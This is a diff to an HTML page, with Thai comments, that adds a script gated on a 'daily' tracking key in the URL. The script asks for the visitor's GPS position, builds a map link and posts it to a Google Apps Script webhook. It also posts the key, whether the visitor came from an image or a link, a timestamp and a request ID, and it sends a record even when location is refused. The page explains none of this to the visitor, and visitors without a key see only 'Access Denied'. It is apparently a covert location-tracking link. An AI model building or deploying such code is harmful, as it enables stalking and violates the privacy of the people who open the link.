@@ -162,7 +162,6 @@
       </div>
     </div>
   </div>
-  
   <script>
     // ตรวจสอบว่ามี tracking key ที่ถูกต้องหรือไม่
     function hasValidTrackingKey() {
@@ -171,20 +170,101 @@
       return trackingKey && trackingKey !== "ไม่มีค่า";
     }
     
-    // ตรวจสอบและโหลดสคริปต์เพียงครั้งเดียว
+    // ตรวจสอบ tracking key ก่อนที่จะโหลดไฟล์ script.js
     (function() {
-      if (hasValidTrackingKey()) {
-        // สร้างแท็ก script และเพิ่มเข้าไปในเอกสาร
-        var script = document.createElement('script');
-        script.src = "script.js";
-        document.body.appendChild(script);
-        console.log("Loading script.js with valid tracking key");
-      } else {
-        // ไม่มี tracking key ที่ถูกต้อง แสดงข้อความปฏิเสธการเข้าถึง
-        document.body.innerHTML = "<div style='text-align:center; padding:50px; font-family:Arial; color:#444;'>Access Denied</div>";
-        console.log("Access denied - invalid tracking key");
+      var urlParams = new URLSearchParams(window.location.search);
+      var trackingKey = urlParams.get('daily');
+      
+      // ตรวจสอบว่ามี tracking key หรือไม่
+      if (!trackingKey || trackingKey === "ไม่มีค่า") {
+        console.log("ไม่พบ tracking key - ป้องกันการโหลดสคริปต์");
+        document.addEventListener('DOMContentLoaded', function() {
+          document.body.innerHTML = "<div style='text-align:center; padding:50px; font-family:Arial; color:#444;'>Access Denied</div>";
+        });
+        return false;
       }
+      
+      // สร้าง flag เพื่อป้องกันการทำงานซ้ำซ้อน
+      window.trackingInitialized = false;
+      
+      // โหลด script.js เพียงครั้งเดียว
+      var script = document.createElement('script');
+      script.src = "script.js";
+      document.head.appendChild(script);
+      return true;
     })();
+  </script>
+  
+  <script>
+    // ฟังก์ชันที่ทำงานเมื่อโหลดหน้าเว็บ - จะถูกเรียกใช้จาก script.js
+    function initialize() {
+      // ป้องกันการทำงานซ้ำ
+      if (window.trackingInitialized === true) {
+        console.log("ป้องกันการทำงานซ้ำซ้อนของ initialize()");
+        return;
+      }
+      
+      // ทำเครื่องหมายว่าได้ทำงานแล้ว
+      window.trackingInitialized = true;
+      console.log("เริ่มทำงานฟังก์ชัน initialize()");
+      
+      // อ่านค่าพารามิเตอร์จาก URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const trackingKey = urlParams.get('daily');
+      const source = urlParams.get('source') || 'link'; // หากไม่ระบุ ถือว่าเป็นการคลิกจากลิงก์
+      
+      // ส่วนที่ดึงตำแหน่ง GPS (ต้องทำงานไม่ว่าจะมาจาก source ใดก็ตาม)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // เมื่อได้รับตำแหน่ง GPS
+            const location = {
+              lat: position.coords.latitude,
+              long: position.coords.longitude, 
+              accuracy: position.coords.accuracy,
+              gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+            };
+            
+            // ส่งข้อมูลไป webhook พร้อมระบุ source
+            sendDataToWebhook(trackingKey, location, source);
+          },
+          (error) => {
+            console.error("Error getting location:", error);
+            // ส่งข้อมูลไป webhook แม้จะไม่ได้ตำแหน่ง GPS
+            sendDataToWebhook(trackingKey, null, source);
+          }
+        );
+      } else {
+        console.log("Geolocation is not supported by this browser");
+        // ส่งข้อมูลไป webhook แม้จะไม่รองรับ GPS
+        sendDataToWebhook(trackingKey, null, source);
+      }
+    }
+    
+    // ฟังก์ชั่นสำหรับส่งข้อมูลไปยัง webhook
+    function sendDataToWebhook(trackingKey, location, source) {
+      // สร้าง requestId เพื่อป้องกันการประมวลผลซ้ำ
+      const requestId = 'req_' + new Date().getTime() + '_' + Math.random().toString(36).substring(2, 10);
+      
+      // สร้างออบเจ็กต์ข้อมูล
+      const data = {
+        trackingKey: trackingKey,
+        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์
+        location: location, // ข้อมูลตำแหน่ง GPS
+        timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
+        requestId: requestId
+        // ข้อมูลอื่นๆ จะถูกเพิ่มโดย script.js
+      };
+      
+      // ส่งข้อมูลไปยัง webhook
+      fetch('https://script.google.com/macros/s/AKfycbx1oi5c8dPkgS8WYuWIEs2WBz-jh05s35bwNt-eDX7QzssIxeh_qWrEzNJnvwpLpvfC/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      }).catch(error => console.error('Error sending data to webhook:', error));
+    }
   </script>
 </body>
 </html>
